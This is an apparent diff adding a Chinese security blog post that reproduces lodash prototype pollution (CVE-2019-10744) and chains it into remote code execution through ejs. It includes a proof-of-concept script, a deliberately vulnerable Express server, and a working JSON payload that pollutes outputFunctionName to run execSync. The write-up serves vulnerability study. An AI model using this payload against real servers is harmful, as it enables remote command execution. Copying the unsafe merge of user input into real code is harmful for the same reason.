@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>Express+lodash+ejs原型链污染RCE | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。 Lodash 库中的 defaultsDeep 函数可能会被包含 constructor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Express+lodash+ejs原型链污染RCE">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。 Lodash 库中的 defaultsDeep 函数可能会被包含 constructor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2022-02-17T01:14:04.000Z">
+<meta property="article:modified_time" content="2022-02-17T02:24:19.248Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">Express+lodash+ejs原型链污染RCE</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-02-17</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~1.95K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1645064659248"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Express-lodash-ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE"><span class="toc-number">1.</span> <span class="toc-text">Express+lodash+ejs原型链污染RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-defaultsDeep-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE-gt-RCE"><span class="toc-number">1.2.</span> <span class="toc-text">原型链-&gt;RCE</span></a></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="Express-lodash-ejs原型链污染RCE"><a href="#Express-lodash-ejs原型链污染RCE" class="headerlink" title="Express+lodash+ejs原型链污染RCE"></a>Express+lodash+ejs原型链污染RCE</h1><h2 id="lodash-defaultsDeep-方法造成的原型链污染（CVE-2019-10744）"><a href="#lodash-defaultsDeep-方法造成的原型链污染（CVE-2019-10744）" class="headerlink" title="lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）"></a>lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</h2><p>2019 年 7 月 2 日，<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">Snyk 发布了一个高严重性原型污染安全漏洞</a>（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p>
+<p>Lodash 库中的 <code>defaultsDeep</code> 函数可能会被包含 <code>constructor</code> 的 Payload 诱骗添加或修改<code>Object.prototype</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;</span><br><span class="line">const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">function check() &#123;</span><br><span class="line">    mergeFn(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">    console.log(Object.whoami)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.le1a.com/2022/02/16/c615491126421.png" alt="1645014128315.png"></p>
+<p><img src="https://img.le1a.com/2022/02/16/20121b5ebc2fe.png" alt="1645014176125.png"></p>
+<h2 id="原型链-gt-RCE"><a href="#原型链-gt-RCE" class="headerlink" title="原型链-&gt;RCE"></a>原型链-&gt;RCE</h2><p>简单的应用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line"></span><br><span class="line">app.set(&#x27;views&#x27;, &#x27;./&#x27;);</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = &#123;&#125;;</span><br><span class="line">    let input = JSON.parse(req.body.content);</span><br><span class="line">    lodash.defaultsDeep(data, input);</span><br><span class="line">    res.json(&#123;message: &quot;OK&quot;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let server = app.listen(8086, &#x27;0.0.0.0&#x27;, function() &#123;</span><br><span class="line">    console.log(&#x27;Listening on port %d&#x27;, server.address().port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>断点res.render(‘index’);调试之后来到ejs库的compile函数</p>
+<p><img src="https://img.le1a.com/2022/02/17/a834519fdf620.png" alt="1645063124436.png"></p>
+<p>这里有个命令注入，outputFunctionName默认undefined，利用lodash.defaultsDeep污染outputFunctionName键，造成命令注入。</p>
+<p>payload</p>
+<p><code>&#123;&quot;type&quot;:&quot;constructor&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;open -a calculator&#39;);//&quot;&#125;&#125;&#125;&#125;</code></p>
+<p>污染之后</p>
+<p><img src="https://img.le1a.com/2022/02/17/18cd65bb89982.jpeg" alt="1645063990685.jpeg"></p>
+<p>post之后get访问/触发render</p>
+<p><img src="https://img.le1a.com/2022/02/17/2ae9a72df3d8d.png" alt="1645063432732.png"></p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/";
+            const title         = "「Express+lodash+ejs原型链污染RCE」";
+            const excerpt       = `Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-201...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-02-17</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" CVE-2022-21824-console.table原型链污染" href="/2022/02/16/CVE-2022-21824/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">这个ctfer好废物</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Express-lodash-ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE"><span class="toc-text">Express+lodash+ejs原型链污染RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-defaultsDeep-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"><span class="toc-text">lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE-gt-RCE"><span class="toc-text">原型链-&gt;RCE</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">31</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fa  fa-book"></i> Express+lodash+ejs原型链污染RCE</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/16/CVE-2022-21824/"><i class="fa  fa-book"></i> CVE-2022-21824-console.table原型链污染</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/15/log4j/"><i class="fa  fa-book"></i> log4j</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/13/Dubbo%20HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa  fa-book"></i> Dubbo HttpInvokerServiceExporter反序列化</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/09/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"><i class="fa  fa-book"></i> PWN学习-栈溢出基础</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
